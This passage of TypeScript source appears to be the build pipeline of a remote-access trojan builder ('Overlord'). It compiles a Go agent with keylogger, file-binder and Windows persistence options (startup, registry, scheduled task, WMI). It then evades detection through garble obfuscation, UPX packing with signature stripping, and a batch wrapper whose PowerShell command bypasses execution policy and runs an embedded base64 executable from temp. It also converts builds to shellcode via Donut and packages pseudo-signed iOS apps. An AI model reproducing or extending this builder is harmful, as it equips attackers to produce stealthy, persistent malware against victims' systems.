        const baseTags: string[] = [];
        if (config.noPrinting) baseTags.push("noprint");
        if (config.disableKeylogger) baseTags.push("nokeylogger");
        if (config.enableWebrtc) baseTags.push("overlord_webrtc");
        if (hasBoundFiles) baseTags.push("hasbinder");
        if (isIosTarget) baseTags.push("ios_target");
        if (config.shellcodeConsole && isShellcodeMode && os === "windows") baseTags.push("shellcode_console");

        // Windows persistence tags (omitted in shellcode mode — handled by two-pass below)
        const winPersistTags: string[] = [];
        if (config.enablePersistence && os === "windows" && !isShellcodeMode) {
          const methods = config.persistenceMethods?.length ? config.persistenceMethods : ["startup"];
          if (methods.includes("startup")) winPersistTags.push("persist_startup");
          if (methods.includes("registry")) winPersistTags.push("persist_registry");
          if (methods.includes("taskscheduler")) winPersistTags.push("persist_taskscheduler");
          if (methods.includes("wmi")) winPersistTags.push("persist_wmi");
        }

        const runBuild = async (tags: string[], outputPath: string) => {
          const buildArgs: string[] = [];
          if (tags.length > 0) buildArgs.push("-tags", tags.join(" "));
          buildArgs.push("-trimpath", "-buildvcs=false");
          if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
          buildArgs.push("-o", outputPath, "./cmd/agent");
          let buildCmd;
          if (config.obfuscate) {
            buildCmd = $`garble ${[...garbleFlags, "build", ...buildArgs]}`;
          } else {
            buildCmd = $`go build ${buildArgs}`;
          }
          const proc = buildCmd.env(env).cwd(clientDir).nothrow();
          for await (const line of proc.lines()) {
            const trimmed = line.trim();
            if (trimmed.length > 0) sendToStream({ type: "output", text: line + "\n", level: "info" });
          }
          const result = await proc;
          if (result.exitCode !== 0) {
            const stderrText = result.stderr.toString();
            if (stderrText) sendToStream({ type: "output", text: stderrText, level: "error" });
            throw new Error(`Build failed for ${platform} (exit ${result.exitCode})`);
          }
        };

        // Two-pass build: shellcode + persistence
        if (isShellcodeMode && config.enablePersistence && !platform.startsWith("android-")) {
          const pass1Path = `${outDir}/${outputName}.pass1`;
          const pass1Tags = [...baseTags];
          if (os === "windows") {
            const methods = config.persistenceMethods?.length ? config.persistenceMethods : ["startup"];
            if (methods.includes("startup")) pass1Tags.push("persist_startup");
            if (methods.includes("registry")) pass1Tags.push("persist_registry");
            if (methods.includes("taskscheduler")) pass1Tags.push("persist_taskscheduler");
            if (methods.includes("wmi")) pass1Tags.push("persist_wmi");
          }
          sendToStream({ type: "output", text: `Two-pass shellcode+persistence build\n  Pass 1: agent with persistence (tags: ${pass1Tags.join(" ")})\n`, level: "info" });
          await runBuild(pass1Tags, pass1Path);

          const pass1Data = fs.readFileSync(pass1Path);
          const selfbinPath = path.join(clientDir, "cmd", "agent", "selfbinary.bin");
          fs.writeFileSync(selfbinPath, pass1Data);
          fs.unlinkSync(pass1Path);

          const pass2Tags = [...baseTags, "selfembed"];
          sendToStream({ type: "output", text: `  Pass 2: selfembed wrapper (tags: ${pass2Tags.join(" ")})\n`, level: "info" });
          await runBuild(pass2Tags, `${outDir}/${outputName}`);
          try { fs.unlinkSync(selfbinPath); } catch {}
        } else {
          const tags = [...baseTags, ...winPersistTags];
          await runBuild(tags, `${outDir}/${outputName}`);
        }

        const filePath = `${outDir}/${outputName}`;
        let finalSize = Bun.file(filePath).size;
        // For .bat/.cmd: go build writes a PE binary; UPX must run first (it needs PE format),
        // then after compression we wrap it in a batch script with an embedded base64 payload.
        const isBatWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");

        if (upxBin) {
          sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
          const originalSize = finalSize;
          try {
            const upxResult = await $`${upxBin} --best ${filePath}`.nothrow().quiet();
            if (upxResult.exitCode !== 0) {
              const stderr = upxResult.stderr.toString().trim();
              sendToStream({ type: "output", text: `WARNING: UPX compression failed (exit ${upxResult.exitCode}): ${stderr}\n`, level: "warn" });
            } else {
              finalSize = Bun.file(filePath).size;
              const ratio = ((1 - finalSize / originalSize) * 100).toFixed(1);
              sendToStream({ type: "output", text: `UPX compressed: ${originalSize} → ${finalSize} bytes (${ratio}% reduction)\n`, level: "info" });

              if (config.upxStripHeaders) {
                const stripped = stripUpxHeaders(filePath);
                if (stripped) {
                  finalSize = Bun.file(filePath).size;
                  sendToStream({ type: "output", text: `UPX headers stripped (signature removed)\n`, level: "info" });
                } else {
                  sendToStream({ type: "output", text: `WARNING: No UPX signatures found to strip\n`, level: "warn" });
                }
              }
            }
          } catch (upxErr: any) {
            sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
          }
        }

        if (isBatWrapper) {
          sendToStream({ type: "output", text: `Wrapping PE binary as ${winExt} script...\n`, level: "info" });
          try {
            const exeBytes = fs.readFileSync(filePath);
            const b64 = exeBytes.toString("base64");
            // Split into 76-char lines so the bat file stays manageable
            const b64Lines = b64.match(/.{1,76}/g) || [b64];
            // Random marker generated at build time using the same uuid util already imported
            const marker = `:OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
            // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
            // decodes base64 to a temp .exe, launches it, then exits.
            const psCmd = [
              `$f=$env:_OVD_SELF;`,
              `$l=[IO.File]::ReadAllLines($f);`,
              `$i=0;`,
              `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
              `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
              `[IO.File]::WriteAllBytes($t,$b);`,
              `Start-Process $t;`,
              `exit`,
            ].join("");
            const wrapper = [
              `@echo off`,
              `setlocal`,
              `set "_OVD_SELF=%~f0"`,
              `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
              `endlocal`,
              `exit /b 0`,
              marker,
              ...b64Lines,
            ].join("\r\n") + "\r\n";
            fs.writeFileSync(filePath, wrapper, "utf8");
            finalSize = fs.statSync(filePath).size;
            sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} script\n`, level: "info" });
          } catch (wrapErr: any) {
            sendToStream({ type: "output", text: `WARNING: Failed to generate bat wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
          }
        }

        // ── IPA packaging for iOS targets ──────────────────────────────────────
        if (os === "ios") {
          sendToStream({ type: "output", text: `Packaging ${outputName} as IPA...\n`, level: "info" });
          try {
            const appName = config.outputName || "Agent";
            const bundleId = config.iosBundleId || "com.overlord.agent";
            const ipaWorkDir = path.join(outDir, `_ipa_${platform}`);
            const payloadAppDir = path.join(ipaWorkDir, "Payload", `${appName}.app`);

            // Create Payload/App.app structure
            fs.mkdirSync(payloadAppDir, { recursive: true });

            // Copy binary into .app
            fs.copyFileSync(filePath, path.join(payloadAppDir, appName));
            fs.chmodSync(path.join(payloadAppDir, appName), 0o755);

            // Generate Info.plist
            const infoPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CFBundleExecutable</key>
	<string>${appName}</string>
	<key>CFBundleIdentifier</key>
	<string>${bundleId}</string>
	<key>CFBundleName</key>
	<string>${appName}</string>
	<key>CFBundleDisplayName</key>
	<string>${appName}</string>
	<key>CFBundleVersion</key>
	<string>${agentVersion}</string>
	<key>CFBundleShortVersionString</key>
	<string>${agentVersion}</string>
	<key>CFBundlePackageType</key>
	<string>APPL</string>
	<key>CFBundleSupportedPlatforms</key>
	<array>
		<string>iPhoneOS</string>
	</array>
	<key>MinimumOSVersion</key>
	<string>14.0</string>
	<key>CFBundleInfoDictionaryVersion</key>
	<string>6.0</string>
	<key>LSRequiresIPhoneOS</key>
	<true/>
	<key>UIDeviceFamily</key>
	<array>
		<integer>1</integer>
		<integer>2</integer>
	</array>
	<key>UISupportedInterfaceOrientations</key>
	<array>
		<string>UIInterfaceOrientationPortrait</string>
	</array>
</dict>
</plist>`;
            fs.writeFileSync(path.join(payloadAppDir, "Info.plist"), infoPlist, "utf8");

            // Attempt pseudo-signing with ldid (system-installed or downloaded on demand).
            try {
              let ldidBin: string | null = null;
              try {
                const tc = await ensureToolchain("ldid", sendToStream);
                ldidBin = path.join(tc.binDir, "ldid");
              } catch (dlErr: any) {
                sendToStream({
                  type: "output",
                  text: `ldid not found and download failed (${dlErr.message || dlErr}); skipping pseudo-signing.\n`,
                  level: "warn",
                });
              }
              if (ldidBin) {
                const ldidSign = await $`${ldidBin} -S ${path.join(payloadAppDir, appName)}`.nothrow().quiet();
                if (ldidSign.exitCode === 0) {
                  sendToStream({ type: "output", text: `Pseudo-signed with ldid\n`, level: "info" });
                } else {
                  sendToStream({ type: "output", text: `WARNING: ldid signing failed (non-fatal)\n`, level: "warn" });
                }
              }
            } catch { /* ldid is optional */ }

            const ipaName = `${outputName}.ipa`;
            const ipaPath = path.join(outDir, ipaName);
            const zipResult = await $`cd ${ipaWorkDir} && zip -r ${ipaPath} Payload/ 2>&1 || true`.nothrow().quiet();

            // Fallback: if system zip isn't available, try creating it manually
            if (!fs.existsSync(ipaPath)) {
              // Use a simple tar+gzip approach as last resort — though real IPAs need zip
              sendToStream({ type: "output", text: `WARNING: zip command not available. Outputting raw Mach-O binary instead of IPA.\n`, level: "warn" });
            } else {
              // Remove the raw binary, replace with IPA
              fs.unlinkSync(filePath);
              finalSize = fs.statSync(ipaPath).size;
              sendToStream({ type: "output", text: `IPA packaged: ${finalSize} bytes\n`, level: "info" });

              // Update output references to point to the IPA
              const ipaOutputName = outputName.endsWith(".ipa") ? outputName : `${outputName}.ipa`;

              // Clean up temp dirs
              fs.rmSync(ipaWorkDir, { recursive: true, force: true });

              // Push IPA file entry instead of raw binary
              (build.files as any[]).push({
                name: ipaOutputName,
                filename: ipaOutputName,
                platform,
                version: agentVersion,
                size: finalSize,
              });
              continue; // Skip the default file push below
            }

            // Clean up temp dirs
            fs.rmSync(ipaWorkDir, { recursive: true, force: true });
          } catch (ipaErr: any) {
            sendToStream({ type: "output", text: `WARNING: IPA packaging failed: ${ipaErr.message || ipaErr}. Output is a raw Mach-O binary.\n`, level: "warn" });
          }
        }
        // ── End IPA packaging ─────────────────────────────────────────────────

        // ── Donut: Windows PE → shellcode ──────────────────────────────────
        let finalOutputName = outputName;
        let finalOutputSize = finalSize;

        if (config.useDonut && os === "windows") {
          sendToStream({ type: "status", text: `Converting ${platform} PE to shellcode…` });
          sendToStream({ type: "output", text: `\nConverting PE → shellcode with Donut...\n`, level: "info" });
          const scOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^.]+$/, ".bin"));
          const binPath = path.join(outDir, scOutputName);
          const donutArch = (actualArch === "386" ? "386" : "amd64") as "386" | "amd64";
          const ok = await runDonut(filePath, binPath, donutArch, sendToStream);
          if (!ok) throw new Error(`Donut shellcode conversion failed for ${platform}`);
          try { fs.unlinkSync(filePath); } catch {}
          finalOutputName = scOutputName;
          finalOutputSize = Bun.file(binPath).size;
          sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
        }

        // ── Linux ELF → shellcode stub ──────────────────────────────────────
        if (config.useLinuxShellcode && os === "linux") {
          sendToStream({ type: "status", text: `Wrapping ${platform} ELF as shellcode…` });
          sendToStream({ type: "output", text: `\nWrapping ELF with Linux shellcode stub...\n`, level: "info" });
          const scOutputName = deps.sanitizeOutputName(outputName + ".bin");
          const binPath = path.join(outDir, scOutputName);
          const ok = buildLinuxShellcode(filePath, binPath, sendToStream);
          if (!ok) throw new Error(`Linux shellcode wrap failed for ${platform}`);
          try { fs.unlinkSync(filePath); } catch {}
          finalOutputName = scOutputName;
          finalOutputSize = Bun.file(binPath).size;
          sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
        }

        (build.files as any[]).push({
          name: finalOutputName,
          filename: finalOutputName,
          platform,
          version: agentVersion,
          size: finalOutputSize,
        });
      } catch (err: any) {
        const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
        logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
        sendToStream({ type: "output", text: errorMsg, level: "error" });
        throw err;
      }
    }

    build.status = "completed";
    logger.info(`[build:${buildId.substring(0, 8)}] Build completed successfully! Built ${build.files.length} file(s)`);
    sendToStream({ type: "output", text: `\n[OK] Build completed successfully!\n`, level: "success" });
    sendToStream({ type: "complete", success: true, files: build.files, buildId, expiresAt: build.expiresAt });

    saveBuild({
      id: build.id,
      status: build.status,
      startTime: build.startTime,
      expiresAt: build.expiresAt,
      files: build.files as any,
      buildTag,
      builtByUserId: config.builtByUserId,
    });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up expired build`);
      buildManager.deleteBuildStream(buildId);
    }, SEVEN_DAYS_MS);
  } catch (err: any) {
    build.status = "failed";
    logger.error(`[build:${buildId.substring(0, 8)}] Build failed:`, err);
    sendToStream({ type: "error", error: err.message || String(err) });
    sendToStream({ type: "complete", success: false, buildId });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up failed build stream`);
      buildManager.deleteBuildStream(buildId);
    }, 60 * 60 * 1000);
  } finally {
    clearInterval(keepAliveTimer);
    for (const sysoFile of generatedSysoFiles) {
      try { fs.unlinkSync(sysoFile); } catch {}
    }
    if (winresTempDir) {
      try { fs.rmSync(winresTempDir, { recursive: true, force: true }); } catch {}
    }
    // Binder cleanup: remove generated Go file, bindfiles dir, and release lock
    if (binderGenPath) {
      try { fs.unlinkSync(binderGenPath); } catch {}
    }
    if (binderFilesDir) {
      try { fs.rmSync(binderFilesDir, { recursive: true, force: true }); } catch {}
    }
    if (binderLockPath) {
      try { fs.unlinkSync(binderLockPath); } catch {}
    }
  }
}
